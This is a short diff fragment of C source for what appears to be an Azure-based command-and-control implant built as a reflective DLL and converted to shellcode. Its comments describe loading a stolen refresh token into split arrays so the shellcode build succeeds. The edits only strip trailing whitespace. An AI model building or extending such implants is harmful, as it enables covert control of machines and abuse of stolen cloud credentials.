@@ -113,7 +113,7 @@ void parseMetaCommand(msvcrtStruct strFuncs, char* command, metaCommandStruct* c
 
 int azurec2() {
     // Variables
-    // Put the Refresh token in these CHAR arrays. Had to break up the token to different arrays. 
+    // Put the Refresh token in these CHAR arrays. Had to break up the token to different arrays.
     // If it one massive array GCC ming will put it in the BSS section instead of the TEXT section. This will cause the shellcode creation to fail
     // Use the string2Array.py tool to make the token a CHAR array
     CHAR refreshToken1[] = {};
@@ -911,8 +911,8 @@ void parseMetaCommand(msvcrtStruct strFuncs, char* command, metaCommandStruct* c
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 {
     BOOL bReturnValue = TRUE;
-	switch( dwReason ) 
-    { 
+	switch( dwReason )
+    {
 		case DLL_QUERY_HMODULE:
 			if( lpReserved != NULL )
 				*(HMODULE *)lpReserved = hAppInstance;
